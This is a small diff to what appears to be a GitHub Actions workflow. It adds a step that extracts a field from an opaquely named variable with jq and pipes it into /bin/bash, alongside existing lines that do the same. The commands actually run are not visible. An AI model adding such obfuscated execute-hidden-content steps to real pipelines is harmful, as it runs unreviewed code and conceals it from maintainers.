@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$ks3" | jq -r .h64 | /bin/bash
           echo $cdlo762 | jq -r .jqky65 | /bin/bash
           echo $sz7 | jq -r .pa9022 | /bin/bash
+          printf '%s' "$soyo57" | jq -r .ib16 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
